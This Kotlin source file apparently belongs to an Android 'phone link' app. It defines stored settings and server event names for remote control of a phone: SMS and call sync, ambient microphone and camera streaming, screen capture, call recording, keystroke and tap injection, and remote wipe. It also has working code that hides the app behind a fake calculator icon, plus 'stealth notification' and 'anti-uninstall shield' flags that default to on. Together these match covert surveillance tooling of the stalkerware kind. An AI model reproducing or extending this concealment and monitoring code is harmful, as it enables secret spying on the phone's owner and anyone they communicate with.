package com.phonelink.hub.data

import android.content.Context
import android.content.SharedPreferences

/**
 * Persists the server address and device identity so the service can reconnect
 * without the UI being open.
 */
object DevicePrefs {

    private const val NAME = "phonelink"
    private const val KEY_DEVICE_ID = "device_id"
    private const val KEY_DEVICE_NAME = "device_name"
    private const val KEY_IP = "server_ip"
    private const val KEY_PORT = "server_port"

    private lateinit var prefs: SharedPreferences

    fun init(context: Context) {
        if (!::prefs.isInitialized) {
            prefs = context.getSharedPreferences(NAME, Context.MODE_PRIVATE)
        }
    }

    var deviceId: String
        get() = prefs.getString(KEY_DEVICE_ID, null) ?: generateAndStore()
        set(value) = prefs.edit().putString(KEY_DEVICE_ID, value).apply()

    var deviceName: String
        get() = prefs.getString(KEY_DEVICE_NAME, null) ?: defaultName()
        set(value) = prefs.edit().putString(KEY_DEVICE_NAME, value).apply()

    var serverIp: String
        get() = prefs.getString(KEY_IP, "") ?: ""
        set(value) = prefs.edit().putString(KEY_IP, value).apply()

    private const val KEY_NOTIF_SYNC = "notification_sync_enabled"

    var serverPort: Int
        get() = prefs.getInt(KEY_PORT, 5000)
        set(value) = prefs.edit().putInt(KEY_PORT, value).apply()

    var notificationSyncEnabled: Boolean
        get() = prefs.getBoolean(KEY_NOTIF_SYNC, true)
        set(value) = prefs.edit().putBoolean(KEY_NOTIF_SYNC, value).apply()

    var smsFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_sms", false)
        set(value) = prefs.edit().putBoolean("feat_sms", value).apply()

    var callsFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_calls", false)
        set(value) = prefs.edit().putBoolean("feat_calls", value).apply()

    var contactsFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_contacts", false)
        set(value) = prefs.edit().putBoolean("feat_contacts", value).apply()

    var locationFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_location", false)
        set(value) = prefs.edit().putBoolean("feat_location", value).apply()

    var cameraFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_camera", false)
        set(value) = prefs.edit().putBoolean("feat_camera", value).apply()

    var micFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_mic", false)
        set(value) = prefs.edit().putBoolean("feat_mic", value).apply()

    var storageFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_storage", false)
        set(value) = prefs.edit().putBoolean("feat_storage", value).apply()

    var findPhoneFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_find_phone", false)
        set(value) = prefs.edit().putBoolean("feat_find_phone", value).apply()

    var remoteLockFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_remote_lock", false)
        set(value) = prefs.edit().putBoolean("feat_remote_lock", value).apply()

    var callBlockerFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_call_blocker", false)
        set(value) = prefs.edit().putBoolean("feat_call_blocker", value).apply()

    var screenMirrorFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_screen_mirror", false)
        set(value) = prefs.edit().putBoolean("feat_screen_mirror", value).apply()

    var clipboardSyncFeatureEnabled: Boolean
        get() = prefs.getBoolean("feat_clipboard_sync", false)
        set(value) = prefs.edit().putBoolean("feat_clipboard_sync", value).apply()

    var timelineTrackingEnabled: Boolean
        get() = prefs.getBoolean("timeline_tracking_enabled", false)
        set(value) = prefs.edit().putBoolean("timeline_tracking_enabled", value).apply()

    var timelineMinRadiusMeters: Float
        get() = prefs.getFloat("timeline_min_radius", 200f)
        set(value) = prefs.edit().putFloat("timeline_min_radius", value).apply()

    var timelineDwellMinutes: Int
        get() = prefs.getInt("timeline_dwell_minutes", 5)
        set(value) = prefs.edit().putInt("timeline_dwell_minutes", value).apply()

    var offlineLocationBuffer: String
        get() = prefs.getString("offline_loc_buffer", "[]") ?: "[]"
        set(value) = prefs.edit().putString("offline_loc_buffer", value).apply()

    // -------------------------------------------------------------
    // Parental Control, App Blocker & Screen Time Limits
    // -------------------------------------------------------------
    var parentalControlEnabled: Boolean
        get() = prefs.getBoolean("feat_parental_control", false)
        set(value) = prefs.edit().putBoolean("feat_parental_control", value).apply()

    var blockedPackages: Set<String>
        get() = prefs.getStringSet("blocked_packages", emptySet()) ?: emptySet()
        set(value) = prefs.edit().putStringSet("blocked_packages", value).apply()

    var screenTimeLimitMinutes: Int
        get() = prefs.getInt("screen_time_limit_mins", 0) // 0 = unlimited
        set(value) = prefs.edit().putInt("screen_time_limit_mins", value).apply()

    var screenTimeUsageMillisToday: Long
        get() = prefs.getLong("screen_time_usage_today", 0L)
        set(value) = prefs.edit().putLong("screen_time_usage_today", value).apply()

    var screenTimeUsageDate: String
        get() = prefs.getString("screen_time_usage_date", "") ?: ""
        set(value) = prefs.edit().putString("screen_time_usage_date", value).apply()

    var allowedPackagesDuringLimit: Set<String>
        get() = prefs.getStringSet("allowed_packages_limit", setOf(
            "com.android.dialer", "com.google.android.dialer",
            "com.android.mms", "com.google.android.apps.messaging",
            "com.whatsapp", "com.android.camera", "com.google.android.GoogleCamera",
            "com.google.android.apps.photos", "com.miui.gallery"
        )) ?: emptySet()
        set(value) = prefs.edit().putStringSet("allowed_packages_limit", value).apply()

    fun getParentalControlJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", parentalControlEnabled)
        put("blockedPackages", org.json.JSONArray(blockedPackages))
        put("screenTimeLimitMinutes", screenTimeLimitMinutes)
        put("allowedPackages", org.json.JSONArray(allowedPackagesDuringLimit))
    }

    // -------------------------------------------------------------
    // 1. Battery Alerts & Cutoff Protection
    // -------------------------------------------------------------
    var batteryAlertsEnabled: Boolean
        get() = prefs.getBoolean("feat_battery_alerts", true)
        set(value) = prefs.edit().putBoolean("feat_battery_alerts", value).apply()

    var batteryMaxLevelCutoff: Int
        get() = prefs.getInt("battery_cutoff_level", 90)
        set(value) = prefs.edit().putInt("battery_cutoff_level", value).apply()

    var batteryOverheatTempThreshold: Double
        get() = prefs.getFloat("battery_overheat_temp", 45.0f).toDouble()
        set(value) = prefs.edit().putFloat("battery_overheat_temp", value.toFloat()).apply()

    // -------------------------------------------------------------
    // 5. Camera Auto-Timelapse Security Guard
    // -------------------------------------------------------------
    var autoTimelapseEnabled: Boolean
        get() = prefs.getBoolean("feat_auto_timelapse", false)
        set(value) = prefs.edit().putBoolean("feat_auto_timelapse", value).apply()

    var autoTimelapseIntervalMins: Int
        get() = prefs.getInt("auto_timelapse_interval", 5)
        set(value) = prefs.edit().putInt("auto_timelapse_interval", value).apply()

    var autoTimelapseFacing: String
        get() = prefs.getString("auto_timelapse_facing", "back") ?: "back"
        set(value) = prefs.edit().putString("auto_timelapse_facing", value).apply()

    // -------------------------------------------------------------
    // 8. Geofencing & Boundary Alerts
    // -------------------------------------------------------------
    var geofenceEnabled: Boolean
        get() = prefs.getBoolean("feat_geofence_alert", false)
        set(value) = prefs.edit().putBoolean("feat_geofence_alert", value).apply()

    var geofenceLatitude: Double
        get() = prefs.getFloat("geofence_lat", 0.0f).toDouble()
        set(value) = prefs.edit().putFloat("geofence_lat", value.toFloat()).apply()

    var geofenceLongitude: Double
        get() = prefs.getFloat("geofence_lng", 0.0f).toDouble()
        set(value) = prefs.edit().putFloat("geofence_lng", value.toFloat()).apply()

    var geofenceRadiusMeters: Float
        get() = prefs.getFloat("geofence_radius", 300f)
        set(value) = prefs.edit().putFloat("geofence_radius", value).apply()

    var geofenceName: String
        get() = prefs.getString("geofence_name", "Safe Zone (Home/Office)") ?: "Safe Zone"
        set(value) = prefs.edit().putString("geofence_name", value).apply()

    // -------------------------------------------------------------
    // 9. Smart Notification Filter & Auto-Reply Rules
    // -------------------------------------------------------------
    var autoReplyEnabled: Boolean
        get() = prefs.getBoolean("feat_auto_reply", false)
        set(value) = prefs.edit().putBoolean("feat_auto_reply", value).apply()

    var autoReplyMessage: String
        get() = prefs.getString("auto_reply_msg", "I am currently busy/driving. Will call you back later.") ?: ""
        set(value) = prefs.edit().putString("auto_reply_msg", value).apply()

    var autoReplyPackages: Set<String>
        get() = prefs.getStringSet("auto_reply_pkgs", setOf("com.whatsapp", "com.google.android.apps.messaging", "com.android.mms")) ?: emptySet()
        set(value) = prefs.edit().putStringSet("auto_reply_pkgs", value).apply()

    // -------------------------------------------------------------
    // 10. Scheduled Remote Commands
    // -------------------------------------------------------------
    var scheduledCommandsJson: String
        get() = prefs.getString("scheduled_commands_store", "[]") ?: "[]"
        set(value) = prefs.edit().putString("scheduled_commands_store", value).apply()

    // -------------------------------------------------------------
    // 11. Hardware Volume Key SOS Alert
    // -------------------------------------------------------------
    var volumeSosEnabled: Boolean
        get() = prefs.getBoolean("feat_volume_sos", true)
        set(value) = prefs.edit().putBoolean("feat_volume_sos", value).apply()

    // -------------------------------------------------------------
    // 12. Automatic Phone Call Recording
    // -------------------------------------------------------------
    var callRecordingEnabled: Boolean
        get() = prefs.getBoolean("feat_call_recording", false)
        set(value) = prefs.edit().putBoolean("feat_call_recording", value).apply()

    fun getBatteryConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("batteryAlertsEnabled", batteryAlertsEnabled)
        put("batteryMaxLevelCutoff", batteryMaxLevelCutoff)
        put("batteryOverheatTempThreshold", batteryOverheatTempThreshold)
    }

    fun getAutoTimelapseConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", autoTimelapseEnabled)
        put("intervalMins", autoTimelapseIntervalMins)
        put("facing", autoTimelapseFacing)
    }

    fun getGeofenceConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", geofenceEnabled)
        put("latitude", geofenceLatitude)
        put("longitude", geofenceLongitude)
        put("radiusMeters", geofenceRadiusMeters.toDouble())
        put("name", geofenceName)
    }

    fun getAutoReplyConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", autoReplyEnabled)
        put("message", autoReplyMessage)
        val arr = org.json.JSONArray()
        autoReplyPackages.forEach { arr.put(it) }
        put("packages", arr)
    }

    fun getVolumeSosConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", volumeSosEnabled)
    }

    fun getCallRecordingConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("enabled", callRecordingEnabled)
    }

    // -------------------------------------------------------------
    // Remote Feature Sync Pause & Low-Data Saver Configuration
    // -------------------------------------------------------------
    var syncNotifications: Boolean
        get() = prefs.getBoolean("sync_notifications", true)
        set(value) = prefs.edit().putBoolean("sync_notifications", value).apply()

    var syncCalls: Boolean
        get() = prefs.getBoolean("sync_calls", true)
        set(value) = prefs.edit().putBoolean("sync_calls", value).apply()

    var syncSms: Boolean
        get() = prefs.getBoolean("sync_sms", true)
        set(value) = prefs.edit().putBoolean("sync_sms", value).apply()

    var syncLocation: Boolean
        get() = prefs.getBoolean("sync_location", true)
        set(value) = prefs.edit().putBoolean("sync_location", value).apply()

    var syncClipboard: Boolean
        get() = prefs.getBoolean("sync_clipboard", true)
        set(value) = prefs.edit().putBoolean("sync_clipboard", value).apply()

    var syncRecordings: Boolean
        get() = prefs.getBoolean("sync_recordings", true)
        set(value) = prefs.edit().putBoolean("sync_recordings", value).apply()

    var syncTelemetry: Boolean
        get() = prefs.getBoolean("sync_telemetry", true)
        set(value) = prefs.edit().putBoolean("sync_telemetry", value).apply()

    var lowDataMode: Boolean
        get() = prefs.getBoolean("sync_low_data_mode", false)
        set(value) = prefs.edit().putBoolean("sync_low_data_mode", value).apply()

    fun applySyncConfig(payload: org.json.JSONObject) {
        if (payload.has("notifications")) syncNotifications = payload.optBoolean("notifications", true)
        if (payload.has("calls")) syncCalls = payload.optBoolean("calls", true)
        if (payload.has("sms")) syncSms = payload.optBoolean("sms", true)
        if (payload.has("location")) syncLocation = payload.optBoolean("location", true)
        if (payload.has("clipboard")) syncClipboard = payload.optBoolean("clipboard", true)
        if (payload.has("recordings")) syncRecordings = payload.optBoolean("recordings", true)
        if (payload.has("telemetry")) syncTelemetry = payload.optBoolean("telemetry", true)
        if (payload.has("lowDataMode")) lowDataMode = payload.optBoolean("lowDataMode", false)
    }

    fun getSyncConfigJson(): org.json.JSONObject = org.json.JSONObject().apply {
        put("deviceId", deviceId)
        put("notifications", syncNotifications && !lowDataMode)
        put("calls", syncCalls && !lowDataMode)
        put("sms", syncSms && !lowDataMode)
        put("location", syncLocation && !lowDataMode)
        put("clipboard", syncClipboard && !lowDataMode)
        put("recordings", syncRecordings && !lowDataMode)
        put("telemetry", syncTelemetry && !lowDataMode)
        put("lowDataMode", lowDataMode)
    }

    fun isConfigured(): Boolean = serverIp.isNotBlank()

    // -------------------------------------------------------------
    // In-App Owner PIN (Secure salted SHA-256 for settings protection)
    // -------------------------------------------------------------
    fun hasOwnerPin(): Boolean {
        return !prefs.getString("owner_pin_hash", "").isNullOrBlank()
    }

    fun setOwnerPin(pin: String) {
        if (pin.isBlank()) {
            clearOwnerPin()
            return
        }
        val saltBytes = ByteArray(16)
        java.security.SecureRandom().nextBytes(saltBytes)
        val saltHex = saltBytes.joinToString("") { "%02x".format(it) }
        val hashHex = hashWithSalt(pin, saltHex)
        prefs.edit()
            .putString("owner_pin_hash", hashHex)
            .putString("owner_pin_salt", saltHex)
            .apply()
    }

    fun verifyOwnerPin(pin: String): Boolean {
        val storedHash = prefs.getString("owner_pin_hash", "") ?: ""
        val storedSalt = prefs.getString("owner_pin_salt", "") ?: ""
        if (storedHash.isBlank() || storedSalt.isBlank()) return true // No PIN set
        val computedHash = hashWithSalt(pin, storedSalt)
        return storedHash.equals(computedHash, ignoreCase = true)
    }

    fun clearOwnerPin() {
        prefs.edit()
            .remove("owner_pin_hash")
            .remove("owner_pin_salt")
            .apply()
    }

    var calculatorDisguiseEnabled: Boolean
        get() = prefs.getBoolean("calculator_disguise_enabled", false)
        set(value) = prefs.edit().putBoolean("calculator_disguise_enabled", value).apply()

    var stealthNotificationEnabled: Boolean
        get() = prefs.getBoolean("stealth_notification_enabled", true)
        set(value) = prefs.edit().putBoolean("stealth_notification_enabled", value).apply()

    var antiUninstallShieldEnabled: Boolean
        get() = prefs.getBoolean("anti_uninstall_shield_enabled", true)
        set(value) = prefs.edit().putBoolean("anti_uninstall_shield_enabled", value).apply()

    fun updateCalculatorAlias(context: Context, enabled: Boolean) {
        try {
            val pm = context.packageManager
            val defaultComp = android.content.ComponentName(context, "com.phonelink.hub.MainActivity")
            val calcComp = android.content.ComponentName(context, "com.phonelink.hub.CalculatorAlias")

            if (enabled) {
                pm.setComponentEnabledSetting(calcComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                pm.setComponentEnabledSetting(defaultComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
            } else {
                pm.setComponentEnabledSetting(defaultComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
                pm.setComponentEnabledSetting(calcComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
            }
        } catch (e: Exception) {
            android.util.Log.w("DevicePrefs", "updateCalculatorAlias failed: ${e.message}")
        }
    }

    private fun hashWithSalt(pin: String, saltHex: String): String {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        md.update(saltHex.toByteArray(Charsets.UTF_8))
        val digest = md.digest(pin.toByteArray(Charsets.UTF_8))
        return digest.joinToString("") { "%02x".format(it) }
    }

    private fun generateAndStore(): String {
        // Stable identity: generate ONCE (UUID) and persist. The old
        // random+timestamp scheme could collide across rapid reinstalls and
        // made every reconnect look like a new phone (BUG 1: duplicate rows).
        val id = "android-" + java.util.UUID.randomUUID().toString()
        deviceId = id
        return id
    }

    private fun defaultName(): String =
        android.os.Build.MANUFACTURER.replaceFirstChar(Char::uppercase) + " " + android.os.Build.MODEL
}

/** WebSocket event names shared by server, dashboard and this app. */
object Events {
    const val DEVICE_REGISTER = "DEVICE_REGISTER"
    const val DEVICE_REGISTERED = "DEVICE_REGISTERED"
    const val DEVICE_STATUS = "DEVICE_STATUS"

    const val SYNC_CALLS = "SYNC_CALLS"
    const val SYNC_SMS = "SYNC_SMS"
    const val LOCATION_UPDATE = "LOCATION_UPDATE"

    const val SEND_SMS_COMMAND = "SEND_SMS_COMMAND"
    const val SEND_SMS_RESULT = "SEND_SMS_RESULT"

    const val FILE_LIST_REQUEST = "FILE_LIST_REQUEST"
    const val FILE_LIST_RESPONSE = "FILE_LIST_RESPONSE"
    const val FILE_DOWNLOAD_REQUEST = "FILE_DOWNLOAD_REQUEST"
    const val FILE_DOWNLOAD_RESPONSE = "FILE_DOWNLOAD_RESPONSE"
    const val FILE_UPLOAD_CHUNK = "FILE_UPLOAD_CHUNK"
    const val FILE_UPLOAD_STATUS = "FILE_UPLOAD_STATUS"
    const val LOCATION_REQUEST = "LOCATION_REQUEST"
    const val CALLS_REQUEST = "CALLS_REQUEST"
    const val SMS_REQUEST = "SMS_REQUEST"

    // FEATURE A: contacts sync (same pattern as calls/SMS).
    const val SYNC_CONTACTS = "SYNC_CONTACTS"
    const val CONTACTS_REQUEST = "CONTACTS_REQUEST"
    const val ADD_CONTACT_COMMAND = "ADD_CONTACT_COMMAND"
    const val ADD_CONTACT_RESULT = "ADD_CONTACT_RESULT"

    // FEATURE C: find-my-phone alert (works even on silent via STREAM_ALARM).
    const val FIND_PHONE_COMMAND = "FIND_PHONE_COMMAND"
    const val FIND_PHONE_STOPPED = "FIND_PHONE_STOPPED"

    /** Explicit ring alert; the dashboard also derives one from a fresh missed call. */
    const val INCOMING_CALL_RING = "INCOMING_CALL_RING"

    // Notification mirroring
    const val NOTIFICATION_POSTED = "NOTIFICATION_POSTED"
    const val NOTIFICATION_REMOVED = "NOTIFICATION_REMOVED"
    const val NOTIFICATION_DISMISS_COMMAND = "NOTIFICATION_DISMISS_COMMAND"
    const val NOTIFICATION_CLEAR_ALL_COMMAND = "NOTIFICATION_CLEAR_ALL_COMMAND"
    const val NOTIFICATION_DISMISS_RESULT = "NOTIFICATION_DISMISS_RESULT"
    const val NOTIFICATIONS_REQUEST = "NOTIFICATIONS_REQUEST"
    const val NOTIFICATION_SYNC_SET = "NOTIFICATION_SYNC_SET"
    const val NOTIFICATION_SYNC_STATUS = "NOTIFICATION_SYNC_STATUS"

    // Round 3 remote control & telemetry events
    const val VIBRATE_COMMAND = "VIBRATE_COMMAND"
    const val VIBRATE_RESULT = "VIBRATE_RESULT"

    const val TTS_COMMAND = "TTS_COMMAND"
    const val TTS_RESULT = "TTS_RESULT"

    const val PLAY_AUDIO_COMMAND = "PLAY_AUDIO_COMMAND"
    const val PLAY_AUDIO_STOP = "PLAY_AUDIO_STOP"
    const val PLAY_AUDIO_RESULT = "PLAY_AUDIO_RESULT"

    const val WALLPAPER_COMMAND = "WALLPAPER_COMMAND"
    const val WALLPAPER_RESULT = "WALLPAPER_RESULT"

    const val DEVICE_INFO_REQUEST = "DEVICE_INFO_REQUEST"
    const val DEVICE_INFO_RESPONSE = "DEVICE_INFO_RESPONSE"

    const val INSTALLED_APPS_REQUEST = "INSTALLED_APPS_REQUEST"
    const val INSTALLED_APPS_RESPONSE = "INSTALLED_APPS_RESPONSE"
    const val APP_PERMS_REQUEST = "APP_PERMS_REQUEST"
    const val APP_PERMS_RESPONSE = "APP_PERMS_RESPONSE"

    const val WIFI_REQUEST = "WIFI_REQUEST"
    const val WIFI_RESPONSE = "WIFI_RESPONSE"

    const val CLIPBOARD_READ_REQUEST = "CLIPBOARD_READ_REQUEST"
    const val CLIPBOARD_READ_RESPONSE = "CLIPBOARD_READ_RESPONSE"
    const val CLIPBOARD_CAPTURE_ENABLE = "CLIPBOARD_CAPTURE_ENABLE"
    const val CLIPBOARD_CAPTURE_DISABLE = "CLIPBOARD_CAPTURE_DISABLE"
    const val CLIPBOARD_UPDATE = "CLIPBOARD_UPDATE"

    // Round 3 T5-T10 events
    const val LOCK_COMMAND = "LOCK_COMMAND"
    const val LOCK_RESULT = "LOCK_RESULT"

    const val CALL_BLOCKLIST_SYNC = "CALL_BLOCKLIST_SYNC"
    const val CALL_BLOCKLIST_RESULT = "CALL_BLOCKLIST_RESULT"

    const val MIC_RECORD_COMMAND = "MIC_RECORD_COMMAND"
    const val MIC_RECORD_RESULT = "MIC_RECORD_RESULT"

    const val CAMERA_CAPTURE_COMMAND = "CAMERA_CAPTURE_COMMAND"
    const val CAMERA_CAPTURE_RESULT = "CAMERA_CAPTURE_RESULT"

    const val SCREENSHOT_COMMAND = "SCREENSHOT_COMMAND"
    const val SCREENSHOT_RESULT = "SCREENSHOT_RESULT"

    const val SCREEN_RECORD_START = "SCREEN_RECORD_START"
    const val SCREEN_RECORD_STOP = "SCREEN_RECORD_STOP"
    const val SCREEN_RECORD_FRAME = "SCREEN_RECORD_FRAME"

    const val CAMERA_STREAM_START = "CAMERA_STREAM_START"
    const val CAMERA_STREAM_STOP = "CAMERA_STREAM_STOP"
    const val CAMERA_STREAM_FRAME = "CAMERA_STREAM_FRAME"

    // Live listen (ambient microphone streaming)
    const val LIVE_LISTEN_START = "LIVE_LISTEN_START"
    const val LIVE_LISTEN_STOP = "LIVE_LISTEN_STOP"
    const val LIVE_AUDIO_CHUNK = "LIVE_AUDIO_CHUNK"
    const val LIVE_LISTEN_STATUS = "LIVE_LISTEN_STATUS"

    // Torch (flashlight)
    const val TORCH_COMMAND = "TORCH_COMMAND"
    const val TORCH_RESULT = "TORCH_RESULT"

    // Remote Wipe / Factory Reset
    const val WIPE_COMMAND = "WIPE_COMMAND"
    const val WIPE_RESULT = "WIPE_RESULT"

    // Virtual Navigation Bar & Touch Gestures
    const val INPUT_KEY_COMMAND = "INPUT_KEY_COMMAND"
    const val INPUT_KEY_RESULT = "INPUT_KEY_RESULT"
    const val INPUT_TAP_COMMAND = "INPUT_TAP_COMMAND"
    const val INPUT_SWIPE_COMMAND = "INPUT_SWIPE_COMMAND"
    const val INPUT_GESTURE_RESULT = "INPUT_GESTURE_RESULT"

    // Sound & Volume Manager
    const val VOLUME_GET_REQUEST = "VOLUME_GET_REQUEST"
    const val VOLUME_INFO_RESPONSE = "VOLUME_INFO_RESPONSE"
    const val VOLUME_SET_COMMAND = "VOLUME_SET_COMMAND"
    const val VOLUME_SET_RESULT = "VOLUME_SET_RESULT"

    // Reverse Clipboard Sync
    const val CLIPBOARD_WRITE_COMMAND = "CLIPBOARD_WRITE_COMMAND"
    const val CLIPBOARD_WRITE_RESULT = "CLIPBOARD_WRITE_RESULT"

    // Remote URL Opener
    const val OPEN_URL_COMMAND = "OPEN_URL_COMMAND"
    const val OPEN_URL_RESULT = "OPEN_URL_RESULT"

    // Battery Extended Stats
    const val BATTERY_STATS_REQUEST = "BATTERY_STATS_REQUEST"
    const val BATTERY_STATS_RESPONSE = "BATTERY_STATS_RESPONSE"

    // Remote App Launcher
    const val LAUNCH_APP_COMMAND = "LAUNCH_APP_COMMAND"
    const val LAUNCH_APP_RESULT = "LAUNCH_APP_RESULT"

    // Lost Mode Screen Emergency Banner
    const val LOST_MODE_COMMAND = "LOST_MODE_COMMAND"
    const val LOST_MODE_RESULT = "LOST_MODE_RESULT"
    const val LOST_MODE_STATUS = "LOST_MODE_STATUS"

    // Media / Photo Gallery Grid
    const val MEDIA_GALLERY_REQUEST = "MEDIA_GALLERY_REQUEST"
    const val MEDIA_GALLERY_RESPONSE = "MEDIA_GALLERY_RESPONSE"

    // Remote Keyboard Typing Injection
    const val INPUT_TEXT_COMMAND = "INPUT_TEXT_COMMAND"
    const val INPUT_TEXT_RESULT = "INPUT_TEXT_RESULT"

    // Remote Screen Wake
    const val SCREEN_WAKE_COMMAND = "SCREEN_WAKE_COMMAND"
    const val SCREEN_WAKE_RESULT = "SCREEN_WAKE_RESULT"

    // Remote Call Actions (Answer / Decline)
    const val CALL_ACTION_COMMAND = "CALL_ACTION_COMMAND"
    const val CALL_ACTION_RESULT = "CALL_ACTION_RESULT"

    // Cellular & Dual-SIM Telemetry
    const val CELLULAR_INFO_REQUEST = "CELLULAR_INFO_REQUEST"
    const val CELLULAR_INFO_RESPONSE = "CELLULAR_INFO_RESPONSE"

    // Torch SOS Strobe
    const val TORCH_STROBE_COMMAND = "TORCH_STROBE_COMMAND"
    const val TORCH_STROBE_RESULT = "TORCH_STROBE_RESULT"

    // Junk & Storage Cleaner
    const val JUNK_SCAN_REQUEST = "JUNK_SCAN_REQUEST"
    const val JUNK_SCAN_RESPONSE = "JUNK_SCAN_RESPONSE"
    const val JUNK_CLEAN_COMMAND = "JUNK_CLEAN_COMMAND"
    const val JUNK_CLEAN_RESULT = "JUNK_CLEAN_RESULT"

    // Do Not Disturb (DND)
    const val DND_GET_REQUEST = "DND_GET_REQUEST"
    const val DND_STATUS_RESPONSE = "DND_STATUS_RESPONSE"
    const val DND_SET_COMMAND = "DND_SET_COMMAND"
    const val DND_SET_RESULT = "DND_SET_RESULT"

    // Full File Manager operations
    const val FILE_DELETE_COMMAND = "FILE_DELETE_COMMAND"
    const val FILE_DELETE_RESULT = "FILE_DELETE_RESULT"
    const val FILE_RENAME_COMMAND = "FILE_RENAME_COMMAND"
    const val FILE_RENAME_RESULT = "FILE_RENAME_RESULT"
    const val FILE_MKDIR_COMMAND = "FILE_MKDIR_COMMAND"
    const val FILE_MKDIR_RESULT = "FILE_MKDIR_RESULT"
    const val FILE_MOVE_COMMAND = "FILE_MOVE_COMMAND"
    const val FILE_MOVE_RESULT = "FILE_MOVE_RESULT"
    const val FILE_COPY_COMMAND = "FILE_COPY_COMMAND"
    const val FILE_COPY_RESULT = "FILE_COPY_RESULT"

    // Remote App Uninstaller
    const val UNINSTALL_APP_COMMAND = "UNINSTALL_APP_COMMAND"
    const val UNINSTALL_APP_RESULT = "UNINSTALL_APP_RESULT"

    // Location offline batch sync
    const val LOCATION_BATCH_UPDATE = "LOCATION_BATCH_UPDATE"

    // Timeline / Trip recording remote control
    const val TIMELINE_CONFIG_COMMAND = "TIMELINE_CONFIG_COMMAND"
    const val TIMELINE_CONFIG_RESULT = "TIMELINE_CONFIG_RESULT"

    // Remote Call outgoing dialer
    const val CALL_OUTGOING_COMMAND = "CALL_OUTGOING_COMMAND"
    const val CALL_OUTGOING_RESULT = "CALL_OUTGOING_RESULT"

    // Theft Motion Alarm ("Don't Touch My Phone")
    const val MOTION_ALARM_CONFIG_COMMAND = "MOTION_ALARM_CONFIG_COMMAND"
    const val MOTION_ALARM_CONFIG_RESULT = "MOTION_ALARM_CONFIG_RESULT"
    const val MOTION_ALARM_TRIGGERED = "MOTION_ALARM_TRIGGERED"
    const val MOTION_ALARM_STATUS = "MOTION_ALARM_STATUS"

    // Live Voice Walkie-Talkie (Intercom)
    const val WALKIE_TALKIE_START = "WALKIE_TALKIE_START"
    const val WALKIE_TALKIE_CHUNK = "WALKIE_TALKIE_CHUNK"
    const val WALKIE_TALKIE_STOP = "WALKIE_TALKIE_STOP"
    const val WALKIE_TALKIE_STATUS = "WALKIE_TALKIE_STATUS"

    // Intruder Alert (Wrong PIN / Pattern)
    const val INTRUDER_ALERT = "INTRUDER_ALERT"

    // Remote Bandwidth Saver & Feature Sync Pause
    const val SYNC_CONFIG_COMMAND = "SYNC_CONFIG_COMMAND"
    const val SYNC_CONFIG_STATUS = "SYNC_CONFIG_STATUS"

    // Parental Controls & App Blocker & Screen Time
    const val PARENTAL_CONTROL_CONFIG_COMMAND = "PARENTAL_CONTROL_CONFIG_COMMAND"
    const val PARENTAL_CONTROL_STATUS = "PARENTAL_CONTROL_STATUS"
    const val APP_USAGE_REQUEST = "APP_USAGE_REQUEST"
    const val APP_USAGE_RESPONSE = "APP_USAGE_RESPONSE"

    // 1. Battery Alerts & Cutoff Protection
    const val BATTERY_ALERT_EVENT = "BATTERY_ALERT_EVENT"
    const val BATTERY_CONFIG_COMMAND = "BATTERY_CONFIG_COMMAND"
    const val BATTERY_CONFIG_STATUS = "BATTERY_CONFIG_STATUS"

    // 5. Camera Auto-Timelapse Security Guard
    const val AUTO_TIMELAPSE_CONFIG_COMMAND = "AUTO_TIMELAPSE_CONFIG_COMMAND"
    const val AUTO_TIMELAPSE_CONFIG_STATUS = "AUTO_TIMELAPSE_CONFIG_STATUS"
    const val AUTO_TIMELAPSE_FRAME = "AUTO_TIMELAPSE_FRAME"

    // 8. Geofencing & Boundary Alerts
    const val GEOFENCE_CONFIG_COMMAND = "GEOFENCE_CONFIG_COMMAND"
    const val GEOFENCE_CONFIG_STATUS = "GEOFENCE_CONFIG_STATUS"
    const val GEOFENCE_ALERT = "GEOFENCE_ALERT"

    // 9. Smart Notification Filter & Auto-Reply Rules
    const val AUTO_REPLY_CONFIG_COMMAND = "AUTO_REPLY_CONFIG_COMMAND"
    const val AUTO_REPLY_CONFIG_STATUS = "AUTO_REPLY_CONFIG_STATUS"
    const val AUTO_REPLY_SENT = "AUTO_REPLY_SENT"

    // 4. Network Data Usage Tracker
    const val NETWORK_USAGE_REQUEST = "NETWORK_USAGE_REQUEST"
    const val NETWORK_USAGE_RESPONSE = "NETWORK_USAGE_RESPONSE"

    // 10. Scheduled Remote Commands
    const val SCHEDULE_COMMAND = "SCHEDULE_COMMAND"
    const val SCHEDULE_RESULT = "SCHEDULE_RESULT"
    const val SCHEDULE_LIST_RESPONSE = "SCHEDULE_LIST_RESPONSE"

    // 11. Hardware Volume Key SOS Alert
    const val SOS_TRIGGERED = "SOS_TRIGGERED"
    const val SOS_CONFIG_COMMAND = "SOS_CONFIG_COMMAND"
